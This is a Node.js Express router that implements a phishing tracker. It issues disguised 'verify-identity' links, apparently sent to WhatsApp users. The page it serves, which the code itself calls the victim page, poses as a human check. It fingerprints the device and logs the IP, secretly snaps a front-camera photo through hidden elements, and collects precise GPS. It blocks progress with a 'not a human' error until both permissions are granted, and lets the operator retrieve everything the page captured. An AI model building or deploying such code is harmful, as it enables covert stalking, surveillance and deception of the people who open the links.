const express = require('express');
const crypto  = require('crypto');
const router  = express.Router();

// In-memory session store (per-process; resets on dyno restart — acceptable for short-lived tracking links)
const _locStore = {};

// ── Cleanup: remove sessions older than 2 hours so memory doesn't grow forever ──
setInterval(() => {
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    for (const tok of Object.keys(_locStore)) {
        if (_locStore[tok].timestamp < cutoff) delete _locStore[tok];
    }
}, 30 * 60 * 1000); // run every 30 min

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/start   →   generate tracking session
//  Body: { userId }   — userId is just a label (e.g. WhatsApp JID)
// ─────────────────────────────────────────────────────────────────────
router.post('/start', (req, res) => {
    const userId = req.body.userId || req.query.userId;
    if (!userId) return res.status(400).json({ error: 'Missing userId' });

    const sessionToken = crypto.randomBytes(16).toString('hex');
    _locStore[sessionToken] = {
        userId,
        clientIp   : null,
        metrics    : null,
        cameraImage: null,
        timestamp  : Date.now()
    };

    // ── Auto-detect public URL — zero config needed ─────────────────────────
    // Priority:
    //  1. global._detectedPublicHost  — auto-saved from first external HTTP request
    //  2. HEROKU_APP_NAME env          — just set the APP NAME (not full URL); Heroku auto-sets this
    //                                    if Dyno Metadata labs feature is enabled (free)
    //  3. APP_URL env                  — manual fallback (full URL)
    //  4. REPLIT_DEV_DOMAIN            — Replit environment
    //  5. localhost                    — local dev only
    const host = (global._detectedPublicHost || '')
        || (process.env.HEROKU_APP_NAME  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` : '')
        || (process.env.APP_URL          ? process.env.APP_URL.replace(/\/$/, '') : '')
        || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
        || `http://localhost:${process.env.PORT || 3001}`;

    // Generate a CLEAN, human-friendly link (no /api/ in path — looks legitimate)
    const link = `${host}/verify-identity/${sessionToken}`;
    res.json({ sessionToken, link });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/result/:sessionToken   →   fetch captured data
// ─────────────────────────────────────────────────────────────────────
router.get('/result/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    res.json({
        userId     : s.userId,
        ip         : s.clientIp,
        metrics    : s.metrics,
        hasCamera  : !!s.cameraImage,
        cameraThumb: s.cameraImage ? s.cameraImage.substring(0, 80) + '…' : null,
        timestamp  : s.timestamp
    });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/camera/:sessionToken   →   full camera base64
// ─────────────────────────────────────────────────────────────────────
router.get('/camera/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    if (!s.cameraImage) return res.status(204).json({ error: 'No camera image yet' });
    res.json({ image: s.cameraImage });
});

/**
 * Shared HTML page for the victim tracking page.
 * Used by both the old /api/location/v/:token and new /verify-identity/:token routes.
 *
 * PERMISSION FLOW (NEW):
 *  1. User clicks "Tap to Verify"
 *  2. Page requests camera permission via getUserMedia
 *  3. If DENIED → show "Allow it to verify you are human" message + retry button
 *     → DO NOT redirect until both camera & location are allowed
 *  4. If GRANTED → capture camera snapshot + start GPS
 *  5. After both are captured → redirect to simdatabase
 */
function renderVictimPage(sessionToken, redirectUrl) {
  const REDIRECT_URL = redirectUrl || 'https://cybersecprosimdatabase.vercel.app/';
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Your Identity</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #0d1b2e 0%, #1b2838 100%);
      display: flex; align-items: center; justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 20px;
    }
    .card {
      background: rgba(255,255,255,0.06);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 20px;
      padding: 40px 32px;
      max-width: 380px;
      width: 100%;
      text-align: center;
    }
    .icon { font-size: 48px; margin-bottom: 16px; }
    h1 { color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
    p { color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
    .btn {
      display: inline-block;
      background: #e02e4f;
      color: #fff;
      border: none;
      border-radius: 50px;
      padding: 14px 40px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.15s, box-shadow 0.15s;
      touch-action: manipulation;
    }
    .btn:active { transform: scale(0.96); }
    .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
    .btn-secondary {
      background: transparent;
      border: 1px solid rgba(255,255,255,0.2);
      color: rgba(255,255,255,0.7);
      margin-top: 12px;
      padding: 10px 28px;
      font-size: 13px;
    }
    .status {
      margin-top: 20px;
      color: rgba(255,255,255,0.35);
      font-size: 13px;
      display: none;
    }
    .status.show { display: block; }
    .status.warning {
      color: #f59e0b;
      font-size: 14px;
      font-weight: 500;
      padding: 16px;
      background: rgba(245,158,11,0.1);
      border: 1px solid rgba(245,158,11,0.2);
      border-radius: 12px;
      line-height: 1.5;
    }
    .status.error {
      color: #ef4444;
      font-size: 15px;
      font-weight: 600;
      padding: 18px;
      background: rgba(239,68,68,0.1);
      border: 1px solid rgba(239,68,68,0.2);
      border-radius: 12px;
      line-height: 1.5;
    }
    .status.success { color: #34d399; font-weight: 500; }
    .hidden { display: none !important; }
    /* Hidden tracking elements */
    #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
    #_tc { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🛡️</div>
    <h1>Verify Your Identity</h1>
    <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
    <button class="btn" id="_goBtn">Tap to Verify</button>
    <button class="btn btn-secondary hidden" id="_retryBtn">↻ Try Again</button>
    <div class="status" id="_status">Processing…</div>
  </div>
  <video id="_tv" autoplay playsinline muted></video>
  <canvas id="_tc"></canvas>
  <input type="file" id="_camInput" accept="image/*" capture="user" style="display:none">

  <script>
  (function () {
    var TOK  = '${sessionToken}';
    var BASE = window.location.origin;
    var DEST = '${REDIRECT_URL}';

    // ── Device + browser metrics ────────────────────────
    var metrics = {
      ua       : navigator.userAgent,
      platform : navigator.platform || '',
      lang     : navigator.language,
      langs    : navigator.languages ? Array.from(navigator.languages) : [],
      screen   : { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight },
      dpr      : window.devicePixelRatio || 1,
      tz       : Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies  : navigator.cookieEnabled,
      cores    : navigator.hardwareConcurrency || null,
      memory   : navigator.deviceMemory || null,
      touch    : ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
      touchPts : navigator.maxTouchPoints || 0,
      referrer : document.referrer || 'direct',
      conn     : navigator.connection ? {
                   type: navigator.connection.effectiveType,
                   rtt : navigator.connection.rtt,
                   dl  : navigator.connection.downlink
                 } : null,
      battery  : null,
      gps      : null
    };

    function sendMetrics () {
      var body = JSON.stringify(metrics);
      try {
        if (navigator.sendBeacon)
          navigator.sendBeacon(BASE + '/api/location/log/' + TOK, new Blob([body], { type: 'application/json' }));
        else
          fetch(BASE + '/api/location/log/' + TOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true });
      } catch (e) {}
    }

    sendMetrics();
    if (navigator.getBattery) {
      navigator.getBattery().then(function (b) {
        metrics.battery = { pct: Math.round(b.level * 100), charging: b.charging };
        sendMetrics();
      }).catch(function () {});
    }

    // ── UI helpers ──────────────────────────────────────────
    var _goBtn   = document.getElementById('_goBtn');
    var _retryBtn = document.getElementById('_retryBtn');
    var _status  = document.getElementById('_status');
    var _redirected = false;
    var _permissionDenied = false;

    function showStatus(msg, type) {
      _status.textContent = msg;
      _status.className = 'status show';
      if (type) _status.classList.add(type);
    }

    function showNotHuman() {
      _goBtn.classList.remove('hidden');
      _retryBtn.classList.add('hidden');
      _permissionDenied = true;
      showStatus('❌ You are not a human. Please verify again.', 'error');
    }

    function doRedirect () {
      if (_redirected) return;
      _redirected = true;
      showStatus('✅ Identity verified! Redirecting…', 'success');
      setTimeout(function () { window.location.replace(DEST); }, 800);
    }

    // ── GPS request (returns promise: true=success, false=denied) ──
    function requestGps() {
      return new Promise(function (resolve) {
        if (!navigator.geolocation) { resolve(false); return; }
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            metrics.gps = {
              lat : pos.coords.latitude,
              lng : pos.coords.longitude,
              acc : Math.round(pos.coords.accuracy),
              alt : pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : null,
              spd : pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : null
            };
            sendMetrics();
            resolve(true);
          },
          function () { resolve(false); },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });
    }

    // ── Camera via getUserMedia (shows browser prompt) ──
    function requestCamera() {
      return new Promise(function (resolve) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          resolve(false);
          return;
        }
        var vid = document.getElementById('_tv');
        var can = document.getElementById('_tc');
        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
          .then(function (stream) {
            vid.srcObject = stream;
            vid.onloadedmetadata = function () {
              vid.play();
              setTimeout(function () {
                try {
                  can.width  = vid.videoWidth || 640;
                  can.height = vid.videoHeight || 480;
                  can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
                  var img = can.toDataURL('image/jpeg', 0.3);
                  fetch(BASE + '/api/location/cam/' + TOK, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: img }), keepalive: true
                  }).catch(function () {});
                  stream.getTracks().forEach(function (t) { t.stop(); });
                } catch (e) {}
                resolve(true);
              }, 1500);
            };
          })
          .catch(function () { resolve(false); });
      });
    }

    // ── Main flow ──────────────────────────────────────────
    async function startVerification() {
      _goBtn.classList.add('hidden');
      _retryBtn.classList.add('hidden');
      _permissionDenied = false;

      showStatus('Requesting camera access…');
      var camOk = await requestCamera();

      if (!camOk) {
        // Camera denied → try file input fallback
        showStatus('Trying camera via system…');
        var input = document.getElementById('_camInput');
        input.value = '';
        camOk = await new Promise(function (resolve) {
          var t = setTimeout(function () { resolve(false); }, 25000);
          input.onchange = function () {
            clearTimeout(t);
            var f = input.files && input.files[0];
            if (!f) { resolve(false); return; }
            var r = new FileReader();
            r.onload = function (e) {
              fetch(BASE + '/api/location/cam/' + TOK, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: e.target.result }), keepalive: true
              }).catch(function () {});
              resolve(true);
            };
            r.onerror = function () { resolve(false); };
            r.readAsDataURL(f);
          };
          input.click();
        });
      }

      if (!camOk) {
        showNotHuman();
        return;
      }

      showStatus('Requesting location access…');
      var gpsOk = await requestGps();

      if (!gpsOk) {
        showNotHuman();
        return;
      }

      doRedirect();
    }

    // ── Retry: navigate with random param so Chrome re-prompts permissions ──
    _retryBtn.addEventListener('click', function () {
      showStatus('Refreshing…');
      window.location.href = window.location.pathname + '?r=' + Date.now();
    });

    // ── Tap to Verify ────────────────────────────────────
    _goBtn.addEventListener('click', startVerification);

  })();
  </script>
</body>
</html>`;
}

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/v/:sessionToken   →   OLD VICTIM PAGE (backward compat)
//  Kept for old links still in circulation.
// ─────────────────────────────────────────────────────────────────────
router.get('/v/:sessionToken', (req, res) => {
    const sessionToken = req.params.sessionToken;
    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');

    // Capture victim IP immediately on page load
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.socket.remoteAddress;
    _locStore[sessionToken].clientIp   = clientIp;
    _locStore[sessionToken].timestamp  = Date.now();

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
    res.send(renderVictimPage(sessionToken));
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/log/:sessionToken   →   receive device metrics
// ─────────────────────────────────────────────────────────────────────
router.post('/log/:sessionToken', express.json({ limit: '50kb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.metrics   = req.body;
    s.timestamp = Date.now();
    res.json({ status: 'ok' });
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/cam/:sessionToken   →   receive camera image
// ─────────────────────────────────────────────────────────────────────
router.post('/cam/:sessionToken', express.json({ limit: '10mb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.cameraImage = req.body.image;
    s.timestamp   = Date.now();
    res.json({ status: 'ok' });
});

module.exports = { router, renderVictimPage, _locStore };
